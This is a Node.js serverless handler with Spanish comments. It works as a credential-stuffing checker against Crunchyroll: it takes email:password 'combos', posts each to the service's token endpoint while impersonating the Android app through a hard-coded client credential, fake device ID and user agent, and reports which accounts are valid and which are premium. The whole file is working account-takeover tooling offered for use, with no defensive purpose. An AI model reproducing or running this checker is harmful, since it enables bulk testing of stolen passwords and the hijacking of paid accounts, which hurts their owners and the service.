const axios = require('axios');

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 200, headers, body: '' };
    }

    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, headers, body: 'Method Not Allowed' };
    }

    try {
        const { combos } = JSON.parse(event.body);
        const results = [];

        for (const combo of combos) {
            if (!combo.includes(':')) continue;
            const [email, password] = combo.split(':');

            try {
                const res = await axios.post('https://beta-api.crunchyroll.com/auth/v1/token', 
                    new URLSearchParams({
                        grant_type: 'password',
                        username: email,
                        password: password,
                        scope: 'offline_access',
                        device_id: 'random_device_id_123',
                        device_name: 'SM-G9810',
                        device_type: 'samsung SM-G955N'
                    }).toString(),
                    {
                        headers: {
                            'Authorization': 'Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'User-Agent': 'Crunchyroll/3.59.0 Android/14 okhttp/4.12.0'
                        }
                    }
                );

                if (res.status === 200 && res.data.access_token) {
                    const isPremium = res.data.scope.includes('mp offline_access');
                    results.push({ email, valid: true, plan: isPremium ? 'PREMIUM' : 'FREE' });
                } else {
                    results.push({ email, valid: false, reason: 'Credenciales inválidas' });
                }
            } catch (err) {
                // ACÁ ESTÁ EL CAMBIO PA' VER EL ERROR REAL
                results.push({ email, valid: false, reason: 'Error: ' + (err.response ? err.response.status : err.message) });
            }
        }

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ results })
        };
    } catch (e) {
        return { statusCode: 500, headers, body: JSON.stringify({ error: e.message }) };
    }
};
